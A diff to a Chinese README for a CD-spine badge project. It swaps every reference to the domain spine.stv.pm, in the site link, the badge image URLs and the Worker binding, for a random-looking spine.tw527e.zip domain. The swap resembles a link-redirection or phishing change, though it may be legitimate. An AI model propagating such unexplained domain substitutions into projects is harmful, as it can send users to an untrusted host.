@@ -21,13 +21,13 @@
 | [`art`](art) | 成品图:每个工具或项目一张独立的侧脊图片。[欢迎贡献](art/README.md)。 |
 | [`skills/cd-spine-art`](skills/cd-spine-art) | 用生图模型绘制成品图的 Agent Skill。 |
 
-访问 [spine.stv.pm](https://spine.stv.pm)。
+访问 [spine.tw527e.zip](https://spine.tw527e.zip)。
 
 ## 使用徽章
 
 ```md
-![TypeScript](https://spine.stv.pm/badge/typescript.svg)
-![My stack](https://spine.stv.pm/badge/typescript,react,docker,claude.svg)
+![TypeScript](https://spine.tw527e.zip/badge/typescript.svg)
+![My stack](https://spine.tw527e.zip/badge/typescript,react,docker,claude.svg)
 ```
 
 写一个名字,侧脊横放,像普通徽章。写多个名字,它们竖着并排成一排。
@@ -90,7 +90,7 @@ pnpm run deploy
 
 这会对 [`apps/web`](apps/web/wrangler.jsonc) 执行 `wrangler deploy`。先用
 `pnpm --filter @repo/web exec wrangler login` 登录。`spines` Worker 绑定
-`spine.stv.pm`，通过 Workers Builds 自动部署 `main` 分支的推送。
+`spine.tw527e.zip`，通过 Workers Builds 自动部署 `main` 分支的推送。
 构建根目录为 `apps/web`，构建命令为 `pnpm -w test`，部署命令为
 `pnpm exec wrangler deploy`，Node.js 版本为 22。
 
